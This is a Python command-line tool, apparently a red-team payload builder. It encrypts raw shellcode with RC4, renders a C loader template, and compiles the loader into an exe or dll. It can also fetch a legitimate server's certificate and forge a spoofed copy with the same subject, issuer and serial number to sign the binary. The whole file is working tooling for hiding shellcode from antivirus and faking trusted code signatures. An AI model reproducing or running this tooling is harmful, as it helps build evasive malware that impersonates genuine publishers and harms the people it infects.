import os
import jinja2
import click
import traceback
import subprocess
import secrets
import ssl

from OpenSSL import crypto
from typing import Iterator


def key_scheduling(key: bytes) -> list:
	sched = [i for i in range(0, 256)]

	i = 0
	for j in range(0, 256):
		i = (i + sched[j] + key[j % len(key)]) % 256
		tmp = sched[j]
		sched[j] = sched[i]
		sched[i] = tmp

	return sched


def stream_generation(sched: list[int]) -> Iterator[bytes]:
	i, j = 0, 0
	while True:
		i = (1 + i) % 256
		j = (sched[i] + j) % 256
		tmp = sched[j]
		sched[j] = sched[i]
		sched[i] = tmp
		yield sched[(sched[i] + sched[j]) % 256]        


def encrypt(plaintext: bytes, key: bytes) -> bytes:
	sched = key_scheduling(key)
	key_stream = stream_generation(sched)
	
	ciphertext = b''
	for char in plaintext:
		enc = char ^ next(key_stream)
		ciphertext += bytes([enc])
		
	return ciphertext

def xxd(data):
	return ','.join('0x{:02x}'.format(i) for i in data)
		

@click.command()
@click.option('--bin', '-b', type=click.Path(exists=True), help='Path to a file with raw shellcode')
@click.option('--arch', '-a', type=click.Choice(['x86', 'x64']), default=None, help='Build architechture')
@click.option('--type', '-t', type=click.Choice(['exe', 'dll']), help='Executable type')
@click.option('--exports', '-e', multiple=True, help='Dll exports')
@click.option('--output', '-o', default=None, type=click.Path(), help='Output file')
@click.option('--sign', '-s', default=None, type=str, help='Spoof online certificate and sign payload (hostname:port format)')
def cli(bin, arch, type, exports, output, sign):
	try:
		with open(bin, 'rb') as f:
			bin_data = f.read()

		key = secrets.token_bytes(16)
		key_len = len(key)
		enc_bin_data = encrypt(bin_data, key)
		enc_bin_data_len = len(enc_bin_data)

		config = {
			'bin': xxd(enc_bin_data),
			'bin_size': enc_bin_data_len,
			'key': xxd(key),
			'key_size': key_len,
		}
			
		if type == 'dll':
			config['dll'] = {}
			if len(exports) > 0:
				config['dll']['exports'] = exports
		elif type == 'exe':
			config['exe'] = True

		script_path = os.path.dirname(os.path.realpath(__file__))
		tldr = jinja2.FileSystemLoader(searchpath=script_path)
		tenv = jinja2.Environment(loader=tldr)
		template = tenv.get_template('main.template')
		with open(os.path.join(script_path, 'main.c'), 'w') as f:
			f.write(template.render(config=config))

		if output is None:
			output = os.path.join(script_path, "build/eva." + type)
		else:
			output = os.path.abspath(output)

		if arch is not None:
			make_cmd = 'make -C {0} ARCH={1} TARGET={2} OUTPUT={3}'.format(script_path, arch, type, output)
			subprocess.run(make_cmd, shell=True)

		if sign is not None:
			# from https://github.com/paranoidninja/CarbonCopy/blob/master/CarbonCopy.py
			host, port = sign.split(':')
			cert = ssl.get_server_certificate((host, int(port)))
			x509 = crypto.load_certificate(crypto.FILETYPE_PEM, cert)

			cert_dir = os.path.join(script_path, "certs")
			os.makedirs(cert_dir, exist_ok=True)

			cncrt = os.path.join(cert_dir, host + '.crt')
			cnkey = os.path.join(cert_dir, host + '.key')
			pfx = os.path.join(cert_dir, host + '.pfx')

			pkey = crypto.PKey()
			pkey.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
			spoof_cert = crypto.X509()
			spoof_cert.set_version(x509.get_version())
			spoof_cert.set_serial_number(x509.get_serial_number())
			spoof_cert.set_subject(x509.get_subject())
			spoof_cert.set_issuer(x509.get_issuer())
			spoof_cert.set_notBefore(x509.get_notBefore())
			spoof_cert.set_notAfter(x509.get_notAfter())
			spoof_cert.set_pubkey(pkey)
			spoof_cert.sign(pkey, 'sha256')

			with open(cncrt, 'wb') as f:
				f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, spoof_cert))
			
			with open(cnkey, 'wb') as f:
				f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, pkey))

			try:
				pkcs12 = crypto.PKCS12()
			except AttributeError:
				pkcs12 = crypto.PKCS12Type()
			
			pkcs12.set_privatekey(pkey)
			pkcs12.set_certificate(spoof_cert)
			pkcs12_data = pkcs12.export()

			with open(pfx, 'wb') as f:
				f.write(pkcs12_data)

			sign_output = os.path.join(os.path.dirname(output), 'signed-' + os.path.basename(output))
			sign_cmd = f'osslsigncode sign -pkcs12 {pfx} -in {output} -out {sign_output}'
			subprocess.run(sign_cmd, shell=True)
	except Exception as e:
		print("[!] Error: ", e)
		print(traceback.format_exc())


if __name__ == '__main__':
	cli()